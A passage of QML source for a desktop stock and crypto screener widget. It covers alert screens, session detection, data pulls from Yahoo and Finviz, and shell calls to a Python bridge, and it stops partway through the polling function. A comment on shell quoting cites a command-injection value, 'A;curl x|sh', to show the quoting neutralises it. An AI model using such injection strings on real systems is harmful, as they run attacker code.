// The screener's engine: no UI, runs for as long as the widget does, so the
// alert feeds keep collecting whichever view is on screen.
//
// The starting Running Up settings were calibrated on 2026-10-22 against a
// reference list of momentum alerts: every one had risen about 3% or more
// within the previous one to two minutes (smallest +2.9%, KRRO), at any
// price ($0.46 SHFS to $60.70 FEIM), green or red on the day (FEIM -11%,
// HOST -4.9%), and volume did not gate it (NCPL fired at a 5-minute RVOL of
// 126%).
//
// SCREENS are the user's to define (Settings → Screeners; screens.js holds the
// shape and the starting list). Each is one of:
//   running -- Running Up: the price is `runPct`% or more above its lowest
//              point in the last `runWindow` minutes, and at a new high for
//              that window.
//   hod     -- High of Day: the price passes the session's high so far.
//   ranked  -- a live list: the pool's top `rankCount` by `rankBy`, rebuilt
//              every pass.
//   value   -- a long-term list: US companies worth `valueCapMin` or more,
//              scored on eight fundamental checks from SEC filings (the
//              scanner's pillars.py, through the bridge, once a
//              day per company) and on their daily trend -- price against
//              the 50-day average, the 50-day against the 200-day, and
//              whether the 50-day is turning up. See "Long-term value".
// Any screen can carry filters (price, change, gap, volume, RVOL, market
// cap, float, short interest, news age) and a scorecard. Every screen reads
// the same pass, so adding screens adds nothing for Yahoo to answer.
//
// The starting High of Day screen is limited to moving small caps ($1-$20,
// up 10%+): without that the whole market's routine late-day highs flood it
// (31 in 3.5 minutes on 2026-10-22, all large caps), and the moves worth
// seeing on that day's reference list were all $3-$16 and up 15-37%.
//
// THE POOL is the active market, not a shortlist: US-listed common stock
// (no OTC, units, warrants, rights or preferreds) trading `poolMinVolume`+
// shares today or averaging `poolMinAvg`+ a day -- about 3,000 stocks -- from
// a paged Yahoo screen every 5 minutes, plus the premarket or after-hours
// gainers from the scanner (contents/code/scannerbridge.py), which
// catches a thin stock waking up before the screen sees its volume.
//
// THE PASS, every `passSeconds` (30): the whole pool through Yahoo's batch
// quote endpoint, 200 symbols a request. Each stock's price and volume are
// kept for the last few minutes, and the triggers read that history. If
// Yahoo refuses (a 429 or an error), the pass slows down, doubling to at
// most 2 minutes, and speeds back up once it is answered again.
//
// SESSIONS (ET, weekdays): premarket 04:00-09:30, regular 09:30-16:00,
// after hours 16:00-20:00. The clock is worked out here from the time of
// day; Yahoo supplies only the UTC offset. Market holidays are not known.
//
// VOLUME. Yahoo's quotes carry the regular session's volume only.
//   premarket -- volume, and its 5-minute RVOL, come from the scanner's
//     premarket list where a stock is on it; otherwise not known. Alerts
//     fire on price, which is all the trigger needs.
//   regular -- the quote's running volume; 5-minute RVOL is the growth over
//     the last 5 minutes against an average 5 minutes of the stock's normal
//     day (its 3-month average over 78). Some platforms measure against the
//     same time of day instead, so their figures differ; the same order of
//     magnitude.
//   after hours -- the regular session's volume; no 5-minute figure.
//
// CRYPTO (a screen's `market`: "crypto"; missing means stocks). Coinbase's
// public market data, no key: the USD pairs (/products, every 6 hours) and
// their 24-hour open, high, low, last and volume plus 30-day volume, all in
// one request (/products/stats, ~31 KB) every 30 seconds -- only while a
// crypto screen exists. Crypto trades around the clock, so it ignores the
// stock sessions: change is over the rolling 24 hours, "high of day" is the
// 24-hour high, volume is the 24 hours' in dollars, RVOL is that against
// the 30-day daily average, and its alert feeds show the last 24 hours.
// Running Up works exactly as for stocks, from the 30-second history.
// Themes come from CoinGecko's categories (see "crypto themes").
//
// CURRENCY (a screen's `currency`, USD when missing). Every quote is in US
// dollars; a screen in another currency shows price, market cap and crypto's
// dollar volume converted, and reads its filters -- and its scorecard -- in
// that currency, so "price at least 5" on a euro screen means EUR 5. Rates:
// Yahoo's "EUR=X" style quotes (units per dollar) every 5 minutes, only for
// the currencies screens use; BTC and ETH from the crypto feed, or Yahoo's
// "BTC-USD" when no crypto screen is running. Stock volume
// is shares and is not converted. An alert keeps its dollar figures and is
// shown at the current rate.
//
// PER ALERTED STOCK, once and then every 15 minutes: float, short interest,
// dilution risk (SEC EDGAR via the scanner's dilution.py -- context, never a
// filter) and the catalyst check, merged into its rows as they arrive.

import QtQuick
import org.kde.plasma.plasmoid
import org.kde.plasma.plasma5support as P5Support
import QtQuick.LocalStorage
import "sounds.js" as Sounds
import "screens.js" as Screens
import "newsfeeds.js" as NewsFeeds
import "scorecards.js" as Scorecards
import "themes.js" as Themes

Item {
    id: eng

    required property var ticker          // main.qml: yget, withCrumb
    readonly property var cfg: Plasmoid.configuration
    readonly property string bridge: String(Qt.resolvedUrl("../code/scannerbridge.py")).replace(/^file:\/\//, "")

    // New York's offset from UTC in seconds, from Yahoo's meta.gmtoffset so
    // daylight saving follows by itself. -14400 (EDT) until the first reply.
    property int etOffset: -14400
    // Minutes since midnight ET, and the ET date, for a time in seconds.
    function etMinutes(t) { const d = new Date((t + etOffset) * 1000); return d.getUTCHours() * 60 + d.getUTCMinutes() }
    function etDay(t) { return new Date((t + etOffset) * 1000).toISOString().slice(0, 10) }
    readonly property int preStart: 4 * 60
    readonly property int openAt: 9 * 60 + 30
    readonly property int closeAt: 16 * 60
    readonly property int postEnd: 20 * 60

    // The session as a property, so views can bind to it; kept current by
    // the minute timer below and by every probe.
    property string currentPhase: phase()

    // The schedule: what the clock says the session should be.
    function clockPhase() {
        const now = Date.now() / 1000
        const weekday = new Date((now + etOffset) * 1000).getUTCDay()
        if (weekday === 0 || weekday === 6) return "closed"
        const m = etMinutes(now)
        if (m < preStart) return "closed"
        if (m < openAt) return "pre"
        if (m < closeAt) return "regular"
        if (m < postEnd) return "post"
        return "closed"
    }

    // The session as it actually is. The clock above only knows the
    // schedule; whether anything is trading is read from the quotes
    // themselves -- every Yahoo quote carries the time of its last trade. So
    // a market holiday reads closed although the clock says open, and a
    // session the clock does not know about reads "overnight": Nasdaq plans
    // a 21:00-04:00 ET session from 6 December 2026, and when it starts the
    // widget follows without a change here. Until the first probe answers,
    // the clock is all there is.
    function phase() {
        const c = clockPhase()
        if (tradingLive === null) return c
        if (c === "closed") return tradingLive ? "overnight" : "closed"
        return tradingLive ? c : "closed"
    }

    // Ten of the most traded names: if two or more have traded in the last
    // 10 minutes, the market is trading. One small request each pass.
    readonly property var probeSymbols: ["SPY", "QQQ", "IWM", "AAPL", "NVDA", "TSLA", "MSFT", "AMZN", "META", "AMD"]
    property var tradingLive: null        // null until the first answer, then true/false
    function lastTrade(q) {
        return Math.max(q.regularMarketTime || 0, q.preMarketTime || 0, q.postMarketTime || 0)
    }
    function probe() {
        ticker.withCrumb(c => {
            ticker.yget("https://query1.finance.yahoo.com/v7/finance/quote?crumb=" + encodeURIComponent(c)
                        + "&symbols=" + probeSymbols.join(","), x => {
                if (x.status === 401) ticker.crumb = ""
                let qs = null
                try { qs = JSON.parse(x.responseText).quoteResponse.result } catch (e) {}
                if (!qs || !qs.length) return     // no answer: keep the last verdict
                const now = Date.now() / 1000
                tradingLive = qs.filter(q => now - lastTrade(q) < 10 * 60).length >= 2
                currentPhase = phase()
            })
        })
    }
    // Overnight there is no session field of its own (none is known before
    // the session exists), so the price is whichever of Yahoo's three was
    // traded most recently.
    function freshestPrice(q) {
        const c = [[q.preMarketPrice, q.preMarketTime], [q.postMarketPrice, q.postMarketTime],
                   [q.regularMarketPrice, q.regularMarketTime]].filter(x => x[0] > 0)
        c.sort((a, b) => (b[1] || 0) - (a[1] || 0))
        return c.length ? c[0][0] : NaN
    }

    // ── session day ───────────────────────────────────────────────────────
    // The trading session a moment belongs to, as an ET date. A session ends
    // at 20:00 ET; anything after that -- the overnight session included --
    // belongs to the next weekday's session, and so does the weekend. This
    // is the day the theme history is filed under, so an overnight session
    // starting Sunday 21:00 is Monday's, not split across two dates. Market
    // holidays are not known (same as the clock).
    function sessionDayOf(t) {
        let d = new Date((t + etOffset) * 1000)
        if (etMinutes(t) >= postEnd) d = new Date(d.getTime() + 86400000)
        while (d.getUTCDay() === 0 || d.getUTCDay() === 6) d = new Date(d.getTime() + 86400000)
        return d.toISOString().slice(0, 10)
    }
    property string sessionDay: ""

    property var candidates: []           // the pool: symbols watched each pass
    property var pmVol: ({})              // symbol -> [{t, v}] running premarket volume
    property var info: ({})               // symbol -> slow-moving facts
    property var hist: ({})               // symbol -> [{t, p, v}] recent passes
    property var quotes: ({})             // symbol -> latest quote figures
    // The screens that run: those switched off in Settings → Screeners are
    // kept there but neither shown nor run, so they cost nothing.
    readonly property var screens: Screens.load(cfg).filter(s => s.on !== false)
    property var feeds: ({})              // screen id -> alerts, newest first
    property var ranked: ({})             // screen id -> ranked rows, best first
    function screen(id) { return screens.find(s => s.id === id) || null }
    property date updated
    property string source: ""            // what the pool is made of
    property int passMs: cfg.passSeconds * 1000   // grows while Yahoo refuses

    signal alerted(string feed)

    // ── scorecards ────────────────────────────────────────────────────────
    // Named rule sets (Settings → Scorecards; scorecards.js). A screen names
    // the one it scores its rows with, or none.
    readonly property var scorecards: Scorecards.load(cfg)
    function scorecard(id) { return id ? Scorecards.find(scorecards, id) : null }

    // The label column. Size bands and the short-interest line are this
    // widget's own.
    function tags(r) {
        const t = []
        if (r.float > 0) t.push(r.float < 10e6 ? "Low float" : r.float < 100e6 ? "Medium float" : "High float")
        if (r.shortFloat >= 20) t.push("High SI")
        return t.join(" · ")
    }

    // ── the scanner bridge ────────────────────────────────────────────────
    property var waiting: ({})            // command -> callback
    P5Support.DataSource {
        id: exec
        engine: "executable"
        connectedSources: []
        onNewData: (source, data) => {
            disconnectSource(source)
            const done = eng.waiting[source]
            delete eng.waiting[source]
            let out = null
            try { out = JSON.parse(String(data["stdout"] || "")) } catch (e) {}
            // Say why, rather than let the features that need the scanner
            // just stay empty: no python3 on this system is the likely one.
            if (done) {
                const code = data["exit code"], err = String(data["stderr"] || "")
                if (code === 127 || /python3.*(not found|No such file)/i.test(err))
                    eng.bridgeError = i18n("Python 3 was not found. Float, short interest, per-stock news, dilution, the calendar and long-term value lists need it; prices, alerts, crypto and your news sources do not.")
                else if (code === 124) eng.bridgeError = i18n("A scanner call timed out (network or SEC slow); it will be tried again.")
                else if (out && out.error) eng.bridgeError = i18n("Scanner: %1", out.error)
                else if (out) eng.bridgeError = ""
            }
            if (out && out.error) out = null
            if (eng.bridgeLive[source]) {
                delete eng.bridgeLive[source]
                if (eng.bridgeSlow[source]) { delete eng.bridgeSlow[source]; eng.bridgeSlowBusy-- }
                else eng.bridgeBusy--
                Qt.callLater(eng.bridgePump)
            }
            if (done) done(out)
        }
    }
    // One shell word, single-quoted: Settings → Data values are typed in, and
    // symbols come from Yahoo, Nasdaq and Finviz, so nothing is ever pasted
    // into a command bare.
    function shq(s) {
        return "'" + String(s).replace(/'/g, "'\\''") + "'"
    }
    // `args`: the bridge command and its arguments as an array, each quoted
    // on its own -- a symbol from upstream such as "A;curl x|sh" stays one
    // harmless word (2026-10-24). A string is still accepted and split on
    // spaces, each word quoted the same way.
    // Calls wait in a queue: at most two run at once (start-up asked for
    // eleven at once, 2026-10-24), plus one long-term value batch, which
    // runs for minutes and has a lane of its own. `urgent` is for a call
    // someone is waiting on (the detail card, a news search): it starts at
    // once.
    property var bridgeQueue: []
    property int bridgeBusy: 0
    property int bridgeSlowBusy: 0
    property var bridgeLive: ({})         // command -> true while it runs
    property var bridgeSlow: ({})         // command -> true for the value lane
    property int bridgeSeq: 0
    function bridgeRun(args, done, seconds, urgent) {
        const argv = (Array.isArray(args) ? args : String(args).split(/\s+/))
                         .map(a => String(a)).filter(a => a.length)
        // The settings travel in a file (bridgeSettings), not on the command
        // line, where any local user could read them with `ps`. The trailing
        // comment makes every call a new source.
        const cmd = "MARKET_TICKER_SETTINGS=" + bridgeSettingsPath
                  + " timeout " + (seconds || 60) + " python3 " + shq(bridge) + " " + shq(cfg.scannerDir)
                  + " " + argv.map(shq).join(" ") + " # " + Date.now() + "." + (bridgeSeq++)
        bridgeQueue.push({ cmd: cmd, done: done, urgent: !!urgent, slow: argv[0] === "value" })
        bridgePump()
    }
    // Settings → Data for the scanner (code/scanner/settings.py names them),
    // as one JSON file only this user can read, under $XDG_RUNTIME_DIR. It is
    // rewritten when they change, and no call starts while it is.
    readonly property string bridgeSettingsPath: "\"${XDG_RUNTIME_DIR:-$HOME/.cache}/plasma-ticker-tape/settings-" + Plasmoid.id + ".json\""
    readonly property string bridgeSettings: JSON.stringify({
        MARKET_TICKER_SEC_CONTACT: String(cfg.secContact || ""),
        MARKET_TICKER_EARNINGS_MIN_CAP: String(cfg.earningsMinCap),
        MARKET_TICKER_RESEARCH_DIR: String(cfg.researchDir || ""),
        MARKET_TICKER_EARNINGS_TICKERS: String(cfg.earningsTickers || "")
    })
    property string bridgeSettingsWritten: ""
    property bool bridgeSettingsBusy: false
    function bridgePump() {
        if (bridgeSettingsBusy) return
        if (bridgeSettingsWritten !== bridgeSettings) {
            const want = bridgeSettings
            bridgeSettingsBusy = true
            const tmp = "\"${XDG_RUNTIME_DIR:-$HOME/.cache}/plasma-ticker-tape/settings-" + Plasmoid.id + ".tmp\""
            const cmd = "umask 077; mkdir -p \"${XDG_RUNTIME_DIR:-$HOME/.cache}/plasma-ticker-tape\""
                      + " && printf '%s' " + shq(want) + " > " + tmp + " && mv -f " + tmp + " " + bridgeSettingsPath
                      + " # " + Date.now() + "." + (bridgeSeq++)
            waiting[cmd] = () => {
                bridgeSettingsWritten = want
                bridgeSettingsBusy = false
                bridgePump()
            }
            exec.connectSource(cmd)
            return
        }
        let i = 0
        while (i < bridgeQueue.length) {
            const job = bridgeQueue[i]
            const lane = job.urgent ? true : job.slow ? bridgeSlowBusy < 1 : bridgeBusy < 2
            if (!lane) { i++; continue }
            bridgeQueue.splice(i, 1)
            if (!job.urgent) {
                bridgeLive[job.cmd] = true
                if (job.slow) { bridgeSlow[job.cmd] = true; bridgeSlowBusy++ } else bridgeBusy++
            }
            waiting[job.cmd] = job.done
            exec.connectSource(job.cmd)
        }
    }
    // Each screen has its own sound (Settings → Screeners), so which one
    // fired can be told by ear, whether or not the pop-up is open. The
    // pop-up's mute button silences them all, the speaker beside a screen's
    // button that screen alone (`mutedScreens`). One sound per screen for a
    // burst of alerts, not one per alert.
    property var lastSound: ({})
    // The last scanner problem, in words, or "" -- shown under the screener.
    property string bridgeError: ""
    readonly property var mutedScreens: {
        try { const l = JSON.parse(cfg.mutedScreens || "[]"); return Array.isArray(l) ? l : [] } catch (e) { return [] }
    }
    function play(id) {
        const sc = screen(id)
        const path = sc ? sc.sound : ""
        if (!cfg.alertSound || !path || mutedScreens.indexOf(id) >= 0) return
        const now = Date.now()
        if (now - (lastSound[id] || 0) < 5000) return
        lastSound[id] = now
        exec.connectSource(Sounds.command(path, cfg.soundPlayer) + " # " + now)
    }

    // ── the pool ──────────────────────────────────────────────────────────
    // Common stock only. Nasdaq's fifth letter marks units (U), warrants (W)
    // and rights (R) -- SPAC pieces that trade thin and set off alerts on a
    // few hundred shares -- and Yahoo writes preferred shares as "-P"
    // (AHT-PD is Ashford Hospitality's Series D preferred).
    // Yahoo writes NYSE's the other way, as a suffix: GME-WT, BCAT-RI,
    // and -WS, -RT, -UN, -U (2026-10-24: they had filled Top Losers).
    function validSymbol(s) {
        return /^[A-Z][A-Z0-9.\-]{0,9}$/.test(s) && !/^[A-Z]{4}[UWR]$/.test(s) && !/-P[A-Z]?$/.test(s)
            && !/-(WT|WS|RI|RT|UN|U)$/.test(s)
    }

    // Every minute: New York's UTC offset, and in
    // premarket or after hours the scanner's list -- its symbols join the
    // pool, and its premarket volumes feed the volume columns.
    function refreshMinute() {
        // Facts (float, short interest, news, dilution) for every stock in
        // the feeds -- including alerts restored from the database, which
        // never passed through raise() -- the 60 most recent, refreshed every
        // 15 minutes by refreshInfo's own staleness check.
        let all = []
        for (const id in feeds) if (marketOf(screen(id)) === "stocks") all = all.concat(feeds[id])
        all.sort((a, b) => b.time - a.time)
        const inFeeds = Array.from(new Set(all.map(a => a.symbol))).slice(0, 60)
        if (inFeeds.length) refreshInfo(inFeeds)
        ticker.yget("https://query1.finance.yahoo.com/v8/finance/chart/SPY?interval=1d&range=1d", x => {
            try {
                const off = JSON.parse(x.responseText).chart.result[0].meta.gmtoffset
                if (typeof off === "number") etOffset = off
            } catch (e) {}
        })
        const ph = phase()
        if (ph === "pre" || ph === "post") {
            bridgeRun([ph === "pre" ? "premarket" : "afterhours"], out => {
                if (!Array.isArray(out)) return
                const now = Date.now()
                if (ph === "pre") {
                    for (const g of out) {
                        if (!(g.volume > 0)) continue
                        const h = (pmVol[g.symbol] || []).filter(x => now - x.t < 30 * 60000)
                        h.push({ t: now, v: g.volume })
                        pmVol[g.symbol] = h
                    }
                }
                extra = out.map(g => g.symbol).filter(validSymbol)
                candidates = Array.from(new Set(pool.concat(extra, valueUniverse)))
            })
        } else {
            extra = []
        }
    }

    // Every 5 minutes: the pool, a paged Yahoo screen of the active market.
    property var pool: []
    property var extra: []
    property var building: []
    function refreshPool() {
        building = []
        poolPage(0)
    }
    function poolPage(offset) {
        ticker.withCrumb(c => {
            const x = new XMLHttpRequest()
            x.onreadystatechange = () => {
                if (x.readyState !== XMLHttpRequest.DONE) return
                if (x.status === 401) { ticker.crumb = ""; finishPool(false); return }
                let res = null
                try { res = JSON.parse(x.responseText).finance.result[0] } catch (e) {}
                if (!res) { finishPool(false); return }
                building = building.concat(res.quotes.map(q => q.symbol).filter(validSymbol))
                // 250 a page, up to 5,000 stocks.
                if (offset + 250 < Math.min(res.total, 5000)) poolPage(offset + 250)
                else finishPool(true)
            }
            x.open("POST", "https://query1.finance.yahoo.com/v1/finance/screener?crumb=" + encodeURIComponent(c))
            x.setRequestHeader("User-Agent", "Mozilla/5.0")
            x.setRequestHeader("Content-Type", "application/json")
            const exch = ["NMS", "NCM", "NGM", "NYQ", "ASE"]
                .map(e => ({ operator: "eq", operands: ["exchange", e] }))
            x.send(JSON.stringify({
                offset: offset, size: 250, sortField: "dayvolume", sortType: "DESC", quoteType: "EQUITY",
                query: { operator: "AND", operands: [
                    { operator: "eq", operands: ["region", "us"] },
                    { operator: "or", operands: exch },
                    { operator: "or", operands: [
                        { operator: "gt", operands: ["dayvolume", cfg.poolMinVolume] },
                        { operator: "gt", operands: ["avgdailyvol3m", cfg.poolMinAvg] }
                    ]}
                ]}
            }))
        })
    }
    // Yahoo refusing a page part-way (a 429 under load) must not shrink the
    // pool: the pages come biggest volume first, so a short pool drops the
    // thin stocks that wake up premarket -- WORX ran +30% at 06:18 CT on
    // 2026-10-26 with no alert on any screen after 06:02. An incomplete
    // refresh adds what it got to the old pool instead of replacing it.
    property bool poolPartial: false
    function finishPool(complete) {
        if (complete && building.length > 0) pool = building
        else if (building.length > 0) pool = Array.from(new Set(pool.concat(building)))
        poolPartial = !complete
        building = []
        candidates = Array.from(new Set(pool.concat(extra, valueUniverse)))
        source = i18n("active market")
    }

    // ── slow facts per candidate ──────────────────────────────────────────
    function refreshInfo(symbols) {
        const now = Date.now()
        const stale = (symbols || candidates).filter(s => !info[s] || now - info[s].at > 15 * 60000)
        // Breaking news: the alert and the headline often land in the same
        // minute, and Finviz lists a story a little after it crosses -- VBIO
        // 2026-10-26 alerted at 08:00:24 ET on an 08:00 ACCESSWIRE story
        // and showed "none in 2 days" for the next 15 minutes. Press
        // releases cross on the hour and the half hour, so a stock on the
        // screens with no catalyst yet has its news alone asked for again
        // every minute in the first five minutes of each half hour (:00-:05,
        // :30-:35), and not between.
        const mm = etMinutes(now / 1000) % 30
        const fresh = mm > 5 ? [] : (symbols || []).filter(s => stale.indexOf(s) < 0 && info[s] && !info[s].catalyst
                                                && now - (info[s].newsAt || 0) >= 55000)
        if (stale.length === 0 && fresh.length === 0) return
        // Mark now, so an overlapping round does not ask twice.
        const next = Object.assign({}, info)
        for (const s of stale) next[s] = Object.assign({}, next[s] || {}, { at: now, newsAt: now })
        for (const s of fresh) next[s] = Object.assign({}, next[s], { newsAt: now })
        info = next
        for (let i = 0; i < fresh.length; i += 15) { const b = fresh.slice(i, i + 15); bridgeRun(["stocks"].concat(b), out => mergeStocks(out, b)) }
        if (stale.length === 0) return

        // In batches of 15, so one bridge call stays well inside its
        // 60-second timeout even when Finviz is slow.
        for (let i = 0; i < stale.length; i += 15) bridgeFacts(stale.slice(i, i + 15))
        yahooFacts(stale)
    }
    function bridgeFacts(stale) {
        bridgeRun(["dilution"].concat(stale), out => {
            if (!out) return
            const n = Object.assign({}, info)
            for (const s in out) n[s] = Object.assign({}, n[s], { dilution: out[s] })
            info = n
        })
        bridgeRun(["stocks"].concat(stale), out => mergeStocks(out, stale))
    }
    // `asked`: the symbols the bridge was asked about. Finviz has no page for
    // some listings (AZTR, NYSE American, 2026-10-26: a 404), which left them
    // with no headline, sector or float; those, and any it gave no headline
    // for, get Google News's newest story the way the quote card does, and
    // Yahoo's company profile stands in for the sector (yahooFacts).
    function mergeStocks(out, asked) {
        if (!out) return
        const n = Object.assign({}, info)
        for (const s in out) {
            const o = out[s]
            const y = n[s] || {}
            const google = y.newsVia === "google" && y.newsTime > (o.newsTime || 0)
            n[s] = Object.assign({}, n[s], {
                finvizFloat: o.float, shortFloat: o.shortFloat,
                sector: o.sector || y.yahooSector || "", industry: o.industry || y.yahooIndustry || "",
                country: o.country || y.yahooCountry || "",
                catalyst: o.catalyst || (google && y.catalyst),
                newsTime: google ? y.newsTime : o.newsTime,
                newsTitle: google ? y.newsTitle : o.newsTitle, newsSource: google ? y.newsSource : o.newsSource,
                newsUrl: google ? y.newsUrl : o.newsUrl || "", newsVia: google ? "google" : "finviz",
                scanner: true
            })
        }
        info = n
        googleNews((asked || []).filter(s => !(out[s] && out[s].newsTime)).slice(0, 10))
    }
    // The newest Google News story on each symbol, by company name or ticker,
    // from the last two days -- the quote card's fallback, for the row's news
    // icon and catalyst flag. A press-wire source counts as a catalyst, as on
    // Finviz (the scanner's PR_WIRES).
    function googleNews(syms) {
        for (const sym of syms) {
            if (!/^[A-Z][A-Z0-9.\-]{0,9}$/.test(sym)) continue
            const n0 = info[sym] || {}
            const name = String(n0.name || (quotes[sym] || {}).name || "")
                .replace(/,?\s+(Inc\.?|Incorporated|Corporation|Corp\.?|Company|Co\.?|Ltd\.?|Limited|plc|Holdings?|Group|S\.A\.|N\.V\.)$/i, "")
            const q = (name ? '"' + name + '" OR ' : "") + sym + " when:2d"
            ticker.yget("https://news.google.com/rss/search?q=" + encodeURIComponent(q) + "&hl=en-US&gl=US&ceid=US:en", x => {
                const item = String(x.responseText || "").split("<item>").slice(1).map(it => {
                    const get = tag => { const r = it.match(new RegExp("<" + tag + "[^>]*>([\\s\\S]*?)</" + tag + ">")); return r ? r[1].replace(/<!\[CDATA\[|\]\]>/g, "").replace(/&amp;/g, "&").replace(/&quot;/g, '"').replace(/&#39;|&apos;/g, "'").trim() : "" }
                    const source = get("source")
                    let title = get("title")
                    if (source && title.endsWith(" - " + source)) title = title.slice(0, -(source.length + 3))
                    return { title: title, url: get("link"), source: source, time: Date.parse(get("pubDate")) }
                }).filter(it => it.title && isFinite(it.time)).sort((a, b) => b.time - a.time)[0]
                if (!item) return
                const cur = info[sym] || {}
                if (cur.newsTime >= item.time) return
                const n = Object.assign({}, info)
                const wire = /newswire|business ?wire|accesswire|newsfile|mediawire/i.test(item.source)
                n[sym] = Object.assign({}, cur, {
                    newsTime: item.time, newsTitle: item.title, newsSource: item.source, newsUrl: item.url,
                    newsVia: "google", catalyst: !!cur.catalyst || (wire && Date.now() - item.time < 2 * 86400000)
                })
                info = n
            })
        }
    }
    // Sector, industry and newest headline -- enough for the sector and theme
    // icons -- for stocks the Calendar and News tabs show that no screen has
    // looked up. Finviz only (no dilution, no Yahoo figures), once an hour
    // each. Kept apart from refreshInfo's `at`, so a stock that later joins a
    // screen still gets its full facts at once.
    // `first`: the screen in view -- its stocks jump the queue, ahead of the
    // calendar's week of reporters.
    function lookupGroups(symbols, first) {
        const now = Date.now()
        if (first) {
            const mine = (symbols || []).filter(s => groupQueue.indexOf(s) >= 0)
            if (mine.length) groupQueue = mine.concat(groupQueue.filter(s => mine.indexOf(s) < 0))
        }
        // A full-facts round (refreshInfo's `at`) only holds a stock back
        // while it can still be on its way: one that failed used to block
        // the look-up for its whole 15 minutes, and the stock sat blank.
        const want = Array.from(new Set(symbols || [])).filter(s => validSymbol(s) && !cquotes[s]
            && !(info[s] && (now - (info[s].at || 0) < 5 * 60000 || now - (info[s].groupsAt || 0) < 3600000)))
        if (!want.length) return
        const next = Object.assign({}, info)
        for (const s of want) next[s] = Object.assign({}, next[s] || {}, { groupsAt: now })
        info = next
        groupQueue = first ? want.concat(groupQueue) : groupQueue.concat(want)
        pumpGroups()
    }
    // One batch at a time: a week can hold 120 reporters, and nine Finviz
    // batches at once were refused wholesale.
    property var groupQueue: []
    property bool groupBusy: false
    function pumpGroups() {
        if (groupBusy || !groupQueue.length) return
        const batch = groupQueue.slice(0, 15)
        groupQueue = groupQueue.slice(15)
        groupBusy = true
        bridgeRun(["stocks"].concat(batch), out => {
            groupBusy = false
            if (out) mergeStocks(out, batch)
            else {
                // Refused or timed out: the hourly "asked" mark would keep
                // the whole batch blank for an hour (SLB, FIX, T and BE on
                // 2026-10-24). Ask again in two minutes instead.
                const n = Object.assign({}, info), again = Date.now() - 3600000 + 2 * 60000
                for (const s of batch) if (n[s] && !n[s].sector) n[s] = Object.assign({}, n[s], { groupsAt: again })
                info = n
            }
            pumpGroups()
        })
    }
    // A stock's sector and theme with their heat, for the Calendar and News
    // tabs. With `headline`, the theme is read from that headline (an
    // article's own), else from the stock's newest; with no symbol, only a
    // theme whose words the headline carries.
    function groupsFor(sym, headline) {
        const out = { sector: null, sectorHeat: null, theme: null, themeHeat: null }
        const crypto = !!(sym && cquotes[sym])
        if (cfg.sectorsOn && sym) {
            const s = sectorOf(sym)
            if (s) { out.sector = s; out.sectorHeat = themeStatus(s.id) }
        }
        if (cfg.themesOn) {
            const t = sym && !headline ? themeOf(sym)
                    : themeFor(sym || "", headline || "", crypto ? "crypto" : "stocks", out.sector ? out.sector.id : "")
            if (t) { out.theme = t; out.themeHeat = themeStatus(t.id) }
        }
        return out
    }
    function yahooFacts(stale) {
        ticker.withCrumb(c => {
            for (const s of stale) {
                ticker.yget("https://query2.finance.yahoo.com/v10/finance/quoteSummary/" + encodeURIComponent(s)
                            + "?modules=summaryDetail,defaultKeyStatistics,price,assetProfile&crumb=" + encodeURIComponent(c), x => {
                    try {
                        const r = JSON.parse(x.responseText).quoteSummary.result[0]
                        const raw = (m, k) => r[m] && r[m][k] && typeof r[m][k].raw === "number" ? r[m][k].raw : NaN
                        const n = Object.assign({}, info)
                        // Yahoo's sector, industry and country, kept apart and
                        // used where Finviz has none (no Finviz page). Its
                        // sector names differ from Finviz's in one place.
                        const ap = r.assetProfile || {}
                        const ysec = ap.sector === "Financial Services" ? "Financial" : (ap.sector || "")
                        const ycty = ap.country === "United States" ? "USA" : (ap.country || "")
                        const had = n[s] || {}
                        n[s] = Object.assign({}, n[s], {
                            yahooSector: ysec, yahooIndustry: ap.industry || "", yahooCountry: ycty,
                            sector: had.sector || ysec, industry: had.industry || ap.industry || "",
                            country: had.country || ycty,
                            name: (r.price && (r.price.shortName || r.price.longName)) || "",
                            yahooFloat: raw("defaultKeyStatistics", "floatShares"),
                            shortShares: raw("defaultKeyStatistics", "sharesShort"),
                            yahooShortFloat: raw("defaultKeyStatistics", "shortPercentOfFloat") * 100,
                            avgVol: raw("summaryDetail", "averageDailyVolume10Day") || raw("summaryDetail", "averageVolume"),
                            shortDate: raw("defaultKeyStatistics", "dateShortInterest")
                        })
                        info = n
                    } catch (e) {}
                })
            }
        })
    }

    // ── the pass ──────────────────────────────────────────────────────────
    property bool passing: false
    // Closed (nights and weekends), quotes are still fetched, every 15
    // minutes instead of every pass: they are the last session's close, which
    // is all the ranked and value lists need -- and the value list's filings
    // checks, which need a price, get the quiet hours they are best suited to.
    // Nothing alerts while closed; see `take`.
    property real lastClosedPass: 0
    property real lastFullPass: 0
    // The quote fields take() reads. Yahoo still adds about 20 of its own,
    // so this trims a 200-stock batch from ~73 KB to ~48 KB (2026-10-24).
    readonly property string quoteFieldList: ["symbol", "shortName", "longName", "marketCap", "sharesOutstanding",
        "regularMarketPrice", "regularMarketPreviousClose", "regularMarketOpen", "regularMarketDayHigh",
        "regularMarketDayLow", "regularMarketVolume", "regularMarketTime", "preMarketPrice", "preMarketTime",
        "postMarketPrice", "postMarketTime", "averageDailyVolume3Month", "averageDailyVolume10Day",
        "fiftyDayAverage", "twoHundredDayAverage", "fiftyTwoWeekHigh", "fiftyTwoWeekLow",
        "firstTradeDateMilliseconds"].join(",")
    // Could this stock pass any stock alert screen? Read from its last quote
    // with half again of margin on price and cap, so a stock nearing a
    // screen's range is asked for before it gets there. Unquoted: yes.
    readonly property var stockAlertScreens: screens.filter(s => marketOf(s) === "stocks" && (s.type === "running" || s.type === "hod"))
    function hotSymbol(sym) {
        const q = quotes[sym]
        if (!q) return true
        for (const sc of stockAlertScreens) {
            const f = sc.filters || {}
            if (f.capMax > 0 && q.marketCap > f.capMax * 1.5) continue
            if (f.capMin > 0 && q.marketCap < f.capMin / 1.5) continue
            if (f.priceMax > 0 && q.price > f.priceMax * 1.5) continue
            if (f.priceMin > 0 && q.price < f.priceMin / 1.5) continue
            return true
        }
        return false
    }
    function pass() {
        const ph = phase()
        if (passing || candidates.length === 0) return
        if (ph === "closed") {
            if (Date.now() - lastClosedPass < Math.max(1, cfg.closedPassMinutes) * 60000) return
            lastClosedPass = Date.now()
        }
        passing = true
        // Smart polling (Settings → Performance): between full passes, only
        // the stocks that could pass an alert screen's price and market-cap
        // filters are asked for; the rest -- which only the ranked lists
        // read -- every `smartRestMinutes`.
        let list = candidates
        if (cfg.smartPoll && ph !== "closed") {
            if (Date.now() - lastFullPass >= Math.max(1, cfg.smartRestMinutes) * 60000) lastFullPass = Date.now()
            else list = candidates.filter(hotSymbol)
        }
